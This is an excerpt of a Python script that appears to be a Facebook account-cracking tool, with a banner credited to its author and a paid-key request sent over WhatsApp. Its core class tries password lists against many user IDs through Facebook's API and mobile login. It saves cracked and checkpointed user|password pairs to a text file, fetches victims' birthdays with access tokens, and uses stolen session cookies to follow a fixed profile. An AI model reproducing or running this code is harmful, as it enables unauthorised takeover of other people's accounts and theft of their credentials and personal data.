...
def logo():
	print("""%s
           ...
           \033[1;33m ╚══════╝╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░
             ...
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : ZIHAD HASAN        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : ZIHAD HASAN        \033[1;93m▇▇
...
def reg2():
    ...
    input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
    time.sleep(3.5)
    tks = 'Dear%20BRO-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
    os.system('am start https://wa.me/+8801302426149?text=' + tks)
...
def chigozie():
    ...
    try:
        ...
        nama = requests.get('https://m.facebook.com/me?access_token=%s'%(tokn)).json()['name']
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : ZIHAD HASAN ");time.sleep (0.03)
    print("             [*]. FACEBOOK   : ZIHAD HASAN");time.sleep (0.03)
    print("             [*]. GITHUB     : ZIHAD HASAN");time.sleep (0.03)   
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        ...
        for pw in __chi__:
            ...
            if "access_token" in p:
                print('\r [OK-BRO] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('ZIHAD-ok.txt' , 'a').write('%s\n' % wrt)
                break
            elif "m.facebook.com" in p["error_msg"]:
                try:
                    ...
                    print('\r%s \033[1;91m[CP-BRO] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r [BRO] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        cp_ttl = session.get(f'https://m.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s \033[1;91m[CP-BRO] %s | %s ' % (K,user,pw))
                        wrt = '%s|%s' % (user,pw)
    ...
    def follow(self,session,coki):
        r = BeautifulSoup(session.get("https://m.facebook.com/profile.php?id=100065533669299",cookies={"cookie":coki}).text,"html.parser")
